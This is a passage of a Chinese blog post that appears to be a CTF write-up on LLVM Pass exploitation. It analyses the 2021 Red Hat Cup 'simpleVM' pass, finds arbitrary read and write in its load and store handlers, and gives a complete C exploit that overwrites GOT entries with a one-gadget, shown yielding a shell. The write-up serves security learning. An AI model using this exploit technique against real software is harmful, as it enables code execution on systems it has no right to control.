class="keyword">if</span> ( v12 )</span><br><span class="line">              *reg += llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v12);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></p>
<p><code>load</code>，一个参数，若为1则以reg1_0为地址取值，赋给reg2_0里；如果为2则以reg2_0为地址取值存到reg1_0里。显然这里没有对其值做任何边界检查，存在任意地址读。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;load&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v21 = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            v20 = <span class="number">0LL</span>;</span><br><span class="line">            v19 = llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v21);</span><br><span class="line">            <span class="keyword">if</span> ( v19 )</span><br><span class="line">            &#123;</span><br><span class="line">              v18 = llvm::ConstantInt::getZExtValue(v19);</span><br><span class="line">              <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">                v20 = reg1_0;</span><br><span class="line">              <span class="keyword">if</span> ( v18 == <span class="number">2</span> )</span><br><span class="line">                v20 = reg2_0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v20 == reg1_0 )</span><br><span class="line">              *reg2_0 = **reg1_0;</span><br><span class="line">            <span class="keyword">if</span> ( v20 == reg2_0 )</span><br><span class="line">              *reg1_0 = **reg2_0;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
<p><code>store</code>，一个参数，若为1则把reg2_0里的值存到reg1_0存的地址指向的空间，若为2则把reg1_0里的值存到reg2_0存的地址指向的空间。显然存在任意地址写<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;store&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v25 = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            v24 = <span class="number">0LL</span>;</span><br><span class="line">            v23 = llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v25);</span><br><span class="line">            <span class="keyword">if</span> ( v23 )</span><br><span class="line">            &#123;</span><br><span class="line">              v22 = llvm::ConstantInt::getZExtValue(v23);</span><br><span class="line">              <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">                v24 = reg1_0;</span><br><span class="line">              <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">                v24 = reg2_0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v24 == reg1_0 )</span><br><span class="line">            &#123;</span><br><span class="line">              **reg1_0 = *reg2_0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( v24 == reg2_0 )</span><br><span class="line">            &#123;</span><br><span class="line">              **reg2_0 = *reg1_0;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
<p>同时给定的<code>opt-8</code>的got表是可写的，且未开启PIE，所以直接改写opt中got表地址为one gadget即可getshell<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">checksec</span></span><br><span class="line">[*] &#x27;/home/ayoung/pwn/llvm/opt-8&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span></span><br></pre></td></tr></table></figure></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>具体一点就是先用add将reg1写入got表地址，然后load(1)把函数真实地址加载到reg2上（mov reg2, [reg1]），接着再add一次把函数真实地址加成onegadget，最后用store(1)把reg2存进reg1指向的got表地址（mov [reg1], reg2）。<br>这里网上的wp都是改写free，我本来想改malloc的发现似乎后来都没调用，索性覆盖一片地址，最后能getshell就行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//clang -emit-llvm -S exp.c -o exp.ll</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x77e120</span>);</span><br><span class="line">    load(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x732dc</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x8</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x8</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x8</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x8</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x8</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x8</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x8</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x8</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ayoung@ubuntu:~/pwn/llvm$ ./opt-8 -load ./VMPass.so -VMPass ./exp.ll</span><br><span class="line">WARNING: You&#x27;re attempting to print out a bitcode file.</span><br><span class="line">This is inadvisable as it may cause display problems. If</span><br><span class="line">you REALLY want to taste LLVM bitcode first-hand, you</span><br><span class="line">can force output with the `-f&#x27; option.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">whoami</span></span></span><br><span class="line">ayoung</span><br><span class="line"><span class="meta prompt_">$ </span></span><br></pre></td></tr></table></figure>
<h2 id="ciscn-2021-satool"><a href="#ciscn-2021-satool" class="headerlink" title="ciscn 2021 satool"></a>ciscn 2021 satool</h2><h2 id="ciscn-2022-satool"><a href="#ciscn-2022-satool" class="headerlink" title="ciscn 2022 satool"></a>ciscn 2022 satool</h2></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">aYoung</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://iamayoung.xyz/2022/07/13/LLVM-PASS-PWN%E5%AD%A6%E4%B9%A0/">https://iamayoung.xyz/2022/07/13/LLVM-PASS-PWN%E5%AD%A6%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://iamayoung.xyz" target="_blank">aYoung's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/llvm/">llvm</a></div><div class="post_share"><div class="social-share" data-image="https://img1.imgtp.com/2022/07/13/qWpwPIW3.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/07/16/house-of-apple/"><img class="prev-cover" src="https://img1.imgtp.com/2022/07/16/CsY1zb7h.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">House_of_apple</div></div></a></div><div class="next-post pull-right"><a href="/2022/07/06/Tinyhttpd%E5%AD%A6%E4%B9%A0/"><img class="next-cover" src="https://img1.imgtp.com/2022/07/12/of8e0yaR.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Tinyhttpd学习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/11/05/ARM入门练习/" title="ARM入门练习"><img class="cover" src="https://z3.ax1x.com/2021/11/05/InQrnI.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-05</div><div class="title">ARM入门练习</div></div></a></div><div><a href="/2020/11/20/CPU工作/" title="PWN入门之cpu工作原理"><img class="cover" src="https://ftp.bmp.ovh/imgs/2020/12/d91e03ffbfd03bc3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-20</div><div class="title">PWN入门之cpu工作原理</div></div></a></div><div><a href="/2021/07/26/FSOP/" title="FSOP"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/06/373b822d88c4973e.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-26</div><div class="title">FSOP</div></div></a></div><div><a href="/2021/07/28/House-of-Orange/" title="House_of_Orange"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/07/4240c846ca572854.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-28</div><div class="title">House_of_Orange</div></div></a></div><div><a href="/2021/07/14/House-of-Rabbit/" title="House_of_Rabbit"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/07/4240c846ca572854.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-14</div><div class="title">House_of_Rabbit</div></div></a></div><div><a href="/2020/12/15/PLT&GOT/" title="延迟绑定与PLT&GOT"><img class="cover" src="https://ftp.bmp.ovh/imgs/2020/12/d06b6b66268e2e62.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-12-15</div><div class="title">延迟绑定与PLT&GOT</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://s4.ax1x.com/2022/01/14/731OZF.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">aYoung</div><div class="author-info__description">aYoung的博客</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">81</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/aYoung-CS"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/aYoung-CS" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">好好学习</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#LLVM"><span class="toc-number">1.</span> <span class="toc-text">LLVM</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LLVM-IR"><span class="toc-number">2.</span> <span class="toc-text">LLVM IR</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LLVM%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7"><span class="toc-number">3.</span> <span class="toc-text">LLVM相关工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LLVM-PASS"><span class="toc-number">4.</span> <span class="toc-text">LLVM PASS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hello-world-of-passes"><span class="toc-number">4.1.</span> <span class="toc-text">Hello world of passes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">4.2.</span> <span class="toc-text">静态分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">4.3.</span> <span class="toc-text">动态调试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">5.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2021%E7%BA%A2%E5%B8%BD%E6%9D%AF-simpleVM"><span class="toc-number">5.1.</span> <span class="toc-text">2021红帽杯 simpleVM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">5.1.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2021-satool"><span class="toc-number">5.2.</span> <span class="toc-text">ciscn 2021 satool</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2022-satool"><span class="toc-number">5.3.</span> <span class="toc-text">ciscn 2022 satool</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/02/12/qemu%E6%90%AD%E5%BB%BAlinux%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83/" title="Qemu搭建linux内核环境"><img src="https://ftp.bmp.ovh/imgs/2020/12/7359e568759eebbb.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Qemu搭建linux内核环境"/></a><div class="content"><a class="title" href="/2023/02/12/qemu%E6%90%AD%E5%BB%BAlinux%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83/" title="Qemu搭建linux内核环境">Qemu搭建linux内核环境</a><time datetime="2023-02-12T11:24:50.000Z" title="发表于 2023-02-12 19:24:50">2023-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/21/%E3%80%90WP%E3%80%91%E8%93%9D%E5%B8%BD%E6%9D%AF2022-final/" title="【WP】蓝帽杯2022_final"><img src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】蓝帽杯2022_final"/></a><div class="content"><a class="title" href="/2022/09/21/%E3%80%90WP%E3%80%91%E8%93%9D%E5%B8%BD%E6%9D%AF2022-final/" title="【WP】蓝帽杯2022_final">【WP】蓝帽杯2022_final</a><time datetime="2022-09-21T12:27:44.000Z" title="发表于 2022-09-21 20:27:44">2022-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/07/%E3%80%90WP%E3%80%91Ethernaut/" title="【WP】Ethernaut"><img src="https://s1.ax1x.com/2022/11/18/zn2XIe.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】Ethernaut"/></a><div class="content"><a class="title" href="/2022/09/07/%E3%80%90WP%E3%80%91Ethernaut/" title="【WP】Ethernaut">【WP】Ethernaut</a><time datetime="2022-09-07T06:46:53.000Z" title="发表于 2022-09-07 14:46:53">2022-09-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/08/26/%E3%80%90WP%E3%80%91qwb2022-final-rdp/" title="【WP】qwb2022_final_rdp"><img src="https://s1.ax1x.com/2022/08/27/vR8Hv6.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】qwb2022_final_rdp"/></a><div class="content"><a class="title" href="/2022/08/26/%E3%80%90WP%E3%80%91qwb2022-final-rdp/" title="【WP】qwb2022_final_rdp">【WP】qwb2022_final_rdp</a><time datetime="2022-08-25T16:11:41.000Z" title="发表于 2022-08-26 00:11:41">2022-08-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/08/09/%E3%80%90WP%E3%80%91%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93jerryscript%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="【WP】记录一道jerryscript引擎漏洞利用"><img src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】记录一道jerryscript引擎漏洞利用"/></a><div class="content"><a class="title" href="/2022/08/09/%E3%80%90WP%E3%80%91%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93jerryscript%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="【WP】记录一道jerryscript引擎漏洞利用">【WP】记录一道jerryscript引擎漏洞利用</a><time datetime="2022-08-09T15:36:48.000Z" title="发表于 2022-08-09 23:36:48">2022-08-09</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By aYoung</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    loader: {
      source: {
        '[tex]/amsCd': '[tex]/amscd'
      }
    },
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        addClass: [200,() => {
          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
            const target = node.parentNode
            if (!target.classList.contains('has-jax')) {
              target.classList.add('mathjax-overflow')
            }
          })
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><script>function loadValine () {
  function initValine () {
    let initData = {
      el: '#vcomment',
      appId: 'L7cFgIQhurvmmSexryctex39-MdYXbMMI',
      appKey: 'EG1BbRP3FTdnTfn0QeeeIDii',
      placeholder: 'Please leave your footprints',
      avatar: 'robohash',
      meta: 'nick/mail/link'.split(','),
      pageSize: '10',
      avatar_cdn: 'https://www.gravatar.com/avatar/',
      lang: 'zh-CN',
      recordIP: true,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: true,
      path: window.location.pathname,
    }

    if (true) { 
      initData.requiredFields= ('nick/mail'.split(','))
    }
    
    if (false) {
      const otherData = false
      initData = Object.assign(initData, otherData)
    }
    
    const valine = new Valine(initData)
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>